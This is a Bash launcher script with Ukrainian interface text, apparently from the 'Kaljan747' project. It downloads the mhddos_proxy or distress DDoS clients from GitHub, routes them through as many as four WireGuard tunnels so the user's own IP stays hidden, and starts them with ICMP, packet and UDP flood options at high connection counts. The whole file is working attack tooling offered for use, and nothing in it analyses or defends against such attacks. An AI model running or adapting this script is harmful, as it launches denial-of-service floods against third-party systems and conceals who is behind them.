#!/bin/bash
set -e

SETTINGS_FILE="$HOME/.kaljan747_settings"
LOG_DIR="$HOME/logs"
LOG_FILE="$LOG_DIR/wg.log"
mkdir -p "$LOG_DIR"
touch "$LOG_FILE"

# === Функції для запиту ===
ask_user_id() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_ID=$(zenity --entry --title="Введення USER-ID" --text="Введіть ваш user-id (тільки цифри):" --width=400)
    else
        read -p "Введіть ваш user-id (тільки цифри): " USER_ID
    fi
}

ask_run_parameters() {
    if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
        USER_SELECTION=$(zenity --forms --title="Kaljan747 Конфігурація" \
            --text="Вкажіть параметри запуску" \
            --add-combo="Модуль" --combo-values="mhddos_proxy|distress" \
            --add-combo="Редагувати INI перед запуском?" --combo-values="Так|Ні" \
            --add-combo="Режим запуску" --combo-values="screen у фоні|screen відкрито|без screen" \
            --width=400)
        [ -z "$USER_SELECTION" ] && { echo "Запуск скасовано"; exit 1; }
        IFS="|" read -r SELECTED_MODULE EDIT_INI SELECTED_RUN_MODE <<< "$USER_SELECTION"
    else
        echo "Виберіть модуль:"
        echo "1) mhddos_proxy"
        echo "2) distress"
        read -p "Ваш вибір (1/2): " mod_choice
        SELECTED_MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )

        echo "Редагувати INI перед запуском?"
        echo "1) Так"
        echo "2) Ні"
        read -p "Ваш вибір (1/2): " edit_choice
        EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )

        echo "Виберіть режим запуску:"
        echo "1) screen у фоні"
        echo "2) screen відкрито"
        echo "3) без screen"
        read -p "Ваш вибір (1/2/3): " run_choice
        case "$run_choice" in
            1) SELECTED_RUN_MODE="screen у фоні";;
            2) SELECTED_RUN_MODE="screen відкрито";;
            3) SELECTED_RUN_MODE="без screen";;
        esac
    fi
}

# === Завантаження/запит налаштувань ===
if [ -f "$SETTINGS_FILE" ]; then
    source "$SETTINGS_FILE"
fi

if [ -z "$USER_ID" ]; then
    while true; do
        ask_user_id
        if [ -z "$USER_ID" ]; then
            echo "User-id обов'язковий. Завершення."
            exit 1
        fi
        if [[ "$USER_ID" =~ ^[0-9]+$ ]]; then
            break
        else
            echo "Помилка: USER-ID має містити тільки цифри!"
        fi
    done
fi

if [ -z "$SELECTED_MODULE" ] || [ -z "$EDIT_INI" ] || [ -z "$SELECTED_RUN_MODE" ]; then
    ask_run_parameters
fi

# === Пошук або підтвердження папки wg_confs ===
if [ -z "$WG_DIR" ] || [ ! -d "$WG_DIR" ]; then
    echo "[+] Шукаю папку wg_confs..."
    WG_DIRS=($(find "$HOME" -type d -name "wg_confs" 2>/dev/null))
    if [ ${#WG_DIRS[@]} -eq 0 ]; then
        echo "[!] У $HOME не знайдено, шукаю у всій файловій системі..."
        WG_DIRS=($(find / -type d -name "wg_confs" 2>/dev/null))
    fi
    if [ ${#WG_DIRS[@]} -eq 0 ]; then
        echo "[-] Папку wg_confs не знайдено."
        exit 1
    fi
    if [ ${#WG_DIRS[@]} -gt 1 ]; then
        echo "[+] Знайдено кілька папок wg_confs:"
        for i in "${!WG_DIRS[@]}"; do
            echo "$((i+1))) ${WG_DIRS[$i]}"
        done
        if [ -n "$DISPLAY" ] && command -v zenity >/dev/null 2>&1; then
            SELECTED_INDEX=$(zenity --list --title="Виберіть папку wg_confs" --column="Номер" --column="Папка" $(for i in "${!WG_DIRS[@]}"; do echo "$((i+1))" "${WG_DIRS[$i]}"; done) --width=600 --height=400 | awk '{print $1}')
        else
            read -p "Введіть номер потрібної папки: " SELECTED_INDEX
        fi
        WG_DIR="${WG_DIRS[$((SELECTED_INDEX-1))]}"
    else
        WG_DIR="${WG_DIRS[0]}"
    fi
    echo "WG_DIR=\"$WG_DIR\"" >> "$SETTINGS_FILE"
fi

echo "[+] Використовую папку: $WG_DIR"

# === Перевірка прав користувача ===
if [ "$(id -u)" -eq 0 ]; then
    SUDO=""
else
    if command -v sudo >/dev/null 2>&1; then
        SUDO="sudo"
    else
        echo "sudo не знайдено. Встановіть або увійдіть як root."
        exit 1
    fi
fi

# === Встановлення залежностей ===
if command -v apt >/dev/null 2>&1; then
    $SUDO apt update -y
    $SUDO apt install -y curl wget git screen sed wireguard zenity
else
    echo "Підтримуваний пакетний менеджер не знайдено."
    exit 1
fi

# === Підготовка папок ===
MODULE_DIR="$HOME/modules"
mkdir -p "$MODULE_DIR"
touch "$MODULE_DIR/mhddos.ini" "$MODULE_DIR/distress.ini"

# === Завантаження модуля ===
case "$SELECTED_MODULE" in
    mhddos_proxy)
        MODULE="$MODULE_DIR/mhddos_proxy"
        CONFIG_FILE="$MODULE_DIR/mhddos.ini"
        MODULE_NAME="mhddos"
        DOWNLOAD_LINK="https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux"
        ;;
    distress)
        MODULE="$MODULE_DIR/distress"
        CONFIG_FILE="$MODULE_DIR/distress.ini"
        MODULE_NAME="distress"
        DOWNLOAD_LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
        ;;
esac

[ -f "$MODULE" ] || wget -qO "$MODULE" "$DOWNLOAD_LINK"
chmod +x "$MODULE"

# === Зупинка всіх активних WG ===
for iface in $(wg show interfaces 2>/dev/null); do
    $SUDO wg-quick down "$iface" || true
    $SUDO ip link delete "$iface" || true
done

# === Підключення 4 робочих тунелів ===
check_wg_connection() {
    curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null 2>&1
}

WG_FILES=($(find "$WG_DIR" -name "*.conf" -type f | shuf))
WG_IFACES=()

for conf in "${WG_FILES[@]}"; do
    IFACE_NAME=$(basename "$conf" .conf)
    $SUDO wg-quick up "$conf" 2>/dev/null
    sleep 2
    if check_wg_connection "$IFACE_NAME"; then
        echo "[+] Інтерфейс $IFACE_NAME працює."
        echo "$(date '+%Y-%m-%d %H:%M:%S') [+] Інтерфейс $IFACE_NAME працює." >> "$LOG_FILE"
        WG_IFACES+=("$IFACE_NAME")
    else
        echo "[-] Інтерфейс $IFACE_NAME не працює. Відключаю."
        echo "$(date '+%Y-%m-%d %H:%M:%S') [-] Інтерфейс $IFACE_NAME не працює. Відключено." >> "$LOG_FILE"
        $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null
        $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
    fi
    if [ "${#WG_IFACES[@]}" -ge 4 ]; then
        break
    fi
done

if [ "${#WG_IFACES[@]}" -eq 0 ]; then
    echo "[-] Жодного робочого тунелю не знайдено. Завершення."
    exit 0
fi

VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")

# === Оновлення INI файлів ===
echo "--use-my-ip 0 --copies 4 -t 12000 --ifaces $VPN_LIST --user-id=$USER_ID" > "$MODULE_DIR/mhddos.ini"
echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$MODULE_DIR/distress.ini"

if [ "$EDIT_INI" = "Так" ]; then
    if [ -n "$DISPLAY" ]; then
        zenity --text-info --editable --filename="$CONFIG_FILE" --title="Редагування INI" > "$CONFIG_FILE.tmp"
        mv "$CONFIG_FILE.tmp" "$CONFIG_FILE"
    else
        nano "$CONFIG_FILE"
    fi
fi

# === Запуск модуля ===
case "$SELECTED_RUN_MODE" in
    "screen у фоні") screen -dmS "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "screen відкрито") screen -S "$MODULE_NAME" "$MODULE" $(cat "$CONFIG_FILE") ;;
    "без screen") "$MODULE" $(cat "$CONFIG_FILE") & ;;
esac

exit 0
